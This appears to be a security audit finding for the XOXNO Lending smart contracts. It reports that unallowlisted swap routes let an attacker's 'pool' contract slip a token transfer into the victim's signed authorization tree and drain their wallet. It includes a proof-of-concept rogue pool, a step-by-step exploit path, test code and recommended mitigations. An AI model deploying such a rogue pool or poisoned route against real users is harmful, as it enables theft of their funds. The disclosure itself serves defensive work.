### Title
Attacker-crafted swap route injects unauthorized token transfers into the caller's signed auth tree, draining arbitrary wallet tokens - ([File: contracts/controller/src/strategies/swap.rs])

### Summary
CVE-2016-1235 is an option-injection bug: `oarsh` passed attacker-controlled input to OpenSSH, where it was reinterpreted as privileged options under a more-trusted context. The direct analog in XOXNO Lending is route-injection: the `swap`/`swap_xdr` bytes submitted to the controller's strategy verbs (and to the router's `execute_strategy` directly) name arbitrary pool and token contract addresses with no allowlist. Code at those addresses executes inside the caller's `require_auth` tree, and any `token.transfer(caller, attacker, amount)` it issues is recorded by the host as a child of the caller's own authorization entry — so a victim who signs the simulated tree authorizes the theft of their entire unrelated wallet balance, exactly like injected SSH options riding on the user's authenticated session.

### Finding Description
The controller verbs `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and `multiply` accept opaque `swap: Bytes` from the caller and forward them unchanged to the configured router via `router.execute_strategy(&controller, &amount_in, swap)` [1](#0-0) . The router decodes the route and invokes whatever pool/token addresses the payload names; the codebase keeps no venue or pool allowlist [2](#0-1) . Because the whole call stack sits beneath the caller's root `require_auth` frame, a rogue "pool" contract that calls `token::Client::transfer(&victim, &attacker, &amount)` has that call recorded as a child invocation of the victim's authorization entry during simulation and accepted in enforcing mode if the victim signs the returned tree.

The repository's own test proves both halves. In recording mode the rogue pool's `transfer` of the victim's full `WALLET_BALANCE` appears as a `sub_invocation` under the victim's `swap_collateral` entry and the wallet is drained [3](#0-2) . In enforcing mode, signing the poisoned tree executes the theft while signing only the honest tree causes the host to reject it [4](#0-3) . The threat model confirms there is no on-chain mitigation: "The router calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization" [5](#0-4) . The controller's own guards (`RouterOverspend`, `NoSwapOutput`) only measure the controller's `token_in`/`token_out` deltas and do not observe, let alone bound, transfers out of the caller's wallet [6](#0-5) .

### Impact Explanation
Theft of user funds. The stolen amount is not bounded by the routed input, the router's min-out check, or the controller's measured-delta guards — the rogue pool can transfer any token and any amount the victim holds, so long as that `transfer` appears in the simulated auth tree the victim signs. In the proof test, Alice loses her full 77,770-unit balance of a token the protocol never listed, in a call where the swap itself settles fairly and passes every protocol risk gate [7](#0-6) . This mirrors the CVE: user-supplied input is reinterpreted as privileged operations (SSH options / auth-tree children) under the victim's authenticated context.

### Likelihood Explanation
A single unprivileged address can submit the payload: `execute_strategy(sender, total_in, swap_xdr)` on the router accepts any signer [8](#0-7) , and `swap_collateral(caller, account_id, current, amount, new, swap)` takes the route bytes as a plain argument [9](#0-8) . Realization requires the victim to sign a route crafted by an attacker — the realistic vector is a malicious/compromised quote or phishing front-end serving a poisoned `routeXdr`, since standard clients copy the simulator's auth entries into the envelope without auditing every child invocation [10](#0-9) . On-chain, nothing prevents the attempt; enforcement rests entirely on the signer inspecting the full auth tree, which the threat model itself shifts to the client [11](#0-10) . Medium-to-high likelihood conditioned on wallet/UX behavior; severity of impact (full wallet drain of arbitrary tokens) is high.

### Recommendation
Mitigations must bound what a route can attach to the caller's auth tree:

- Constrain venue invocation targets: maintain a governance-controlled allowlist of pool contracts per venue, or pin venue adapters to immutable pool factories/registries, so `swap_xdr` cannot name arbitrary contracts below the signer's auth frame.
- Where arbitrary pools must be supported, execute hops through a router sub-frame that re-auths as the router contract only (invoker auth), never leaving caller-authorized frames open while third-party code runs — e.g., isolate venue calls behind an intermediate contract that holds no user `require_auth` context.
- Have the controller/router record the complete set of token contracts touched during `execute_strategy` and expose a view/estimate that clients must cross-check against the signed tree; document that any child invocation other than the single input `transfer` must be rejected by wallets [12](#0-11) .
- At minimum, emit a simulation-time signal (event or return metadata) enumerating `require_auth` addresses encountered inside the route so integrators can auto-flag poisoned trees.

### Proof of Concept
```rust
// tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs

/// Attacker-deployed "pool" referenced by the route's pool index.
pub fn swap(env: Env) {
    let (victim, wallet_token, to, amount): (Address, Address, Address, i128) =
        env.storage().instance().get(&symbol_short!("PLAN")).unwrap();
    if amount > 0 {
        // Runs under Alice's swap_collateral auth frame; recorded as her child.
        token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
    }
}
```

Exploit path:

1. Attacker deploys `RogueHopPool` configured with `(victim = Alice, wallet_token, attacker, WALLET_BALANCE)` and builds a `swap_xdr`/route whose hop names that contract as the pool — the venue dispatch performs no allowlist check [2](#0-1) .
2. Victim (or a compromised quote UI acting for them) submits `controller.swap_collateral(alice, account_id, USDC, amount, ETH, route)`. The controller authorizes only its own input transfer and invokes the router [1](#0-0) .
3. During `simulateTransaction` (recording mode), the rogue `transfer(alice → attacker, 77_770_000_000)` is attached as a `sub_invocation` under Alice's `swap_collateral` auth entry; Alice's wallet shows balance 0, attacker's shows the full amount [13](#0-12) .
4. If Alice's wallet signs the simulation-returned tree, enforcing mode executes the theft (`s.wallet(&s.alice) == 0`, `s.wallet(&s.attacker) == WALLET_BALANCE`); only a signer that rejects the extra child entry is safe, and the swap still settles fairly and passes the controller's risk gates either way [14](#0-13) .

The same injection applies to direct `router.execute_strategy(sender, total_in, swap_xdr)` calls and every controller verb that forwards route bytes (`multiply`, `swap_debt`, `repay_debt_with_collateral`).

### Citations

**File:** contracts/controller/src/strategies/swap.rs (L33-38)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L34-40)
```rust
    match hop.venue {
        SwapVenue::Soroswap => soroswap::swap(&ctx),
        SwapVenue::Aquarius => aquarius::swap(&ctx, tokens_cache),
        SwapVenue::Phoenix => phoenix::swap(&ctx),
        SwapVenue::Sushi => sushi::swap(&ctx),
        SwapVenue::CometDex => comet::swap(&ctx),
    };
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L239-269)
```rust
    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** skills/xoxno-swap-aggregator/payload.md (L91-100)
```markdown
Order of operations, with the error raised on failure:

1. `sender.require_auth()`.
2. `total_in <= 0` → `InvalidAmount = 3`.
3. `Program::decode(ops, assets.len(), amounts.len())` — packed-program checks above;
   venue-dependent LP checks happen during execution.
4. `amounts[min_out] <= 0` → `SlippageExceeded = 5`.
5. **Measured input credit:** `transfer_amount_measured(token_in, sender → router, total_in)` (`common/src/token.rs`) transfers under the sender's auth and credits the vault with `balance_after − balance_before`, not the declared `total_in`. A fee-on-transfer input shrinks the credited amount instead of drawing on the fee reserve.
6. **Fee side:** `fee_on_input = referral_id != 0 && (!out_whitelisted || in_whitelisted)`; when true, `fees::apply_fees_on_token(token_in)` debits the vault before any hop.
7. Instruction loop. Swap: resolve the input by mode (`InvalidAmount` if `<= 0`), `vault.withdraw`, `venues::dispatch_hop` — measures the router's own `token_in`/`token_out` balances around the venue call; received `<= 0` → `ZeroOutput = 7`; spent `!= amount_in` → `InvalidAmount` — then `vault.deposit(token_out, received)`. Burn: reads Aquarius pool tokens and share id, validates the full constituent-floor span, withdraws the vault's whole share-token balance, checks each receipt against its floor (`MinAmountsNotMet = 28`), and deposits every constituent. Mint: reads and validates Aquarius metadata, deposits the vault's constituent balances, and requires `mint_min_shares > 0` and `shares >= mint_min_shares` (`MinSharesNotMet = 27`).
```

**File:** skills/xoxno-swap-aggregator/payload.md (L109-114)
```markdown
## Authorization model

The only signature is the sender's. `execute_strategy` calls `sender.require_auth()`, and the sender's auth entry must cover the nested `token_in.transfer(sender, router, total_in)`; simulation produces that tree (`transaction.simulated = true` envelopes already carry it — `attach_simulated_transaction` copies the simulator's `auth` into the op — and `simulateTransaction` produces it for a locally built one). Do **not** `transfer` or `approve` tokens to the router beforehand: the router pulls the input itself, and tokens sent ahead of time are not credited.

Every venue call is self-authorized by the router with invoker-contract auth (`venues/auth.rs::authorize_as_current` → `env.authorize_as_current_contract`): Phoenix and Sushi (`HopContext::authorize_pool_pull`) and Aquarius (`aquarius/pool.rs::invoke_pool_swap`) register `token_in.transfer(router, pool, amount_in)` before the pool pulls; Comet registers `token_in.approve(router, pool, amount_in, expiry)`, then `swap_exact_amount_in` with a nested entry for the pool's `transfer_from`, then clears the allowance; Soroswap transfers from the router to the pool directly. None of these appear in the sender's auth tree.

```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-47)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
```
